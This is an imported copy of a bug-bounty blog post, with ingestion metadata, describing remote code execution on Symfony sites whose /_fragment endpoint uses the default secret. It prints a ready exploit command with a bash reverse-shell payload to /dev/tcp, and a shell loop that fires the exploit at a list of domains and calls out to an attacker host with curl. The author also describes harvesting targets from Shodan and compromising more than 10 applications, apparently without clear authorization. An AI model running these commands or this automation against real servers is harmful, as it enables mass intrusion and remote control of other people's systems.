---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-13_how-i-got-rce-in-10-websites.md
original_filename: 2023-04-13_how-i-got-rce-in-10-websites.md
title: How I got RCE in + 10 websites…
category: documents
detected_topics:
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: ad2ce50df3d76190b8e53358a1bc62cac83e3eb80f32d387cd308646fb938d1c
text_sha256: 45ab8e1daa2a103273438a134361385695759f27d11296030c755f76f9d92055
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# How I got RCE in + 10 websites…

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-13_how-i-got-rce-in-10-websites.md
- Source Type: markdown
- Detected Topics: command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `ad2ce50df3d76190b8e53358a1bc62cac83e3eb80f32d387cd308646fb938d1c`
- Text SHA256: `45ab8e1daa2a103273438a134361385695759f27d11296030c755f76f9d92055`


## Content

---
title: "How I got RCE in + 10 websites…"
url: "https://medium.com/@crd0x49/how-i-got-rce-in-10-websites-26dd87441f22"
authors: ["m4cddr (@m4cddr)"]
bugs: ["RCE", "Security misconfiguration"]
publication_date: "2023-04-13"
added_date: "2023-04-15"
source: "pentester.land/writeups.json"
original_index: 1269
scraped_via: "browseros"
---

# How I got RCE in + 10 websites…

How I got RCE in + 10 websites…
crd0x49
Follow
4 min read
·
Apr 13, 2023

292

4

Press enter or click to view image in full size

Hello Hackers, all right?

Many may say that the title of this article is a strategy to attract people, but that is not the objective. The goal here is to share the knowledge and success I’ve had with this exploration.

Obs.: Only explore sites that you have permission to.

One day I was looking at some articles around here and I came across the title of the article “How I hacked 28 sites at once [RCE]” and as I was already studying more about this type of attack, it caught my attention.

How I hacked 28 sites at once [RCE]
Attention: My purpose in sharing this post is for your learning and attention only. If your company, organization, or…

al1z4deh.medium.com

I encourage everyone to read the article because it is very complete, in fact I leave my thanks to Al1z4deh:~# echo “Welcome” for sharing the knowledge! Thanks! Follow his medium.

Al1z4deh:~# echo "Welcome" - Medium
Read writing from Al1z4deh:~# echo "Welcome" on Medium. Al1z4deh:~# echo "eJPT, CEH, OSCP". Every day, Al1z4deh:~# echo…

al1z4deh.medium.com

When I saw that it was Symfony, I soon remembered that I had already seen this in some recon in the past. Soon I went in search of the host and I will refer to example.com and it was still exposed. So I decided to query the path /_fragment detailed in the article mentioned above and the page was different due to the active debug.

Press enter or click to view image in full size

Even though it was different, I continued with the exploration using the script below. As usual, I read the code to understand what was happening and how to exploit this vulnerability.

symfony-exploits/secret_fragment_exploit.py at main · ambionics/symfony-exploits
You can't perform that action at this time. You signed in with another tab or window. You signed out in another tab or…

github.com

When executing the line of code below, I noticed that the site returned an error talking about a possible overflow and also the file was not saving as expected. I believe it to be a bug in the application itself that was being tested.

After the error I decided to just remove the out.txt output, believing that it would trigger the command directly on the screen for me and as expected it happened!

Press enter or click to view image in full size

After that I decided to check if I had access to a reverse shell, checking if there was any control that would bar the output to the internet and to my surprise, that didn’t exist.

python3 secret_fragment_exploit.py 'https://m4cddr.com/app_dev.php/_fragment' --method 1 --secret 'ThisTokenIsNotSoSecretChangeIt' --algo 'sha256' --internal-url 'https://m4cddr.com/app_dev.php/_fragment' --function shell_exec --parameters cmd:'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

That was the result.

Press enter or click to view image in full size

How to automate this?

Get crd0x49’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Quickly in my script I created a function that receives some values to exploit this vulnerability automatically.

RCESymfony(){
  for i in $(cat domains); do python3 secret_fragment_exploit.py $i/_fragment --method 1 --secret 'ThisTokenIsNotSoSecretChangeIt' --algo 'sha256' --internal-url "$i"/_fragment --function shell_exec --parameters cmd:" curl https://$3" | anew -q RCEsymfony.tmp;done
  for i in $(cat RCEsymfony.tmp);do curl $i | anew -q RCEsymfony-$i.txt;done
  }

The third argument is the DNS server of your choice.

This was the way I found to automate and obviously there are other ways to accomplish this process. That’s up to everyone’s creativity.

I also created a Nuclei template to do this for me, but this is private and I leave it as homework and as an incentive for you to create your own template.

After this automation, I decided to go to Shodan to identify the applications that run this framework and many appeared as expected. So I downloaded this information and ran my automation, where I managed to exploit + 10 applications through this vulnerability.

Notes:

Never doubt your intuition. Sometimes, you just need time and thinking outside the box to get results that even you wouldn’t expect.

Tks to read this article. Share it if possible!

Again I would like to thank Al1z4deh:~# echo “Welcome” who helped me in this exploration through the article. Tks so much bro!

Al1z4deh:~# echo "Welcome" - Medium
Read writing from Al1z4deh:~# echo "Welcome" on Medium. Al1z4deh:~# echo "eJPT, CEH, OSCP". Every day, Al1z4deh:~# echo…

al1z4deh.medium.com

Follow me!
Twitter: https://twitter.com/m4cddr
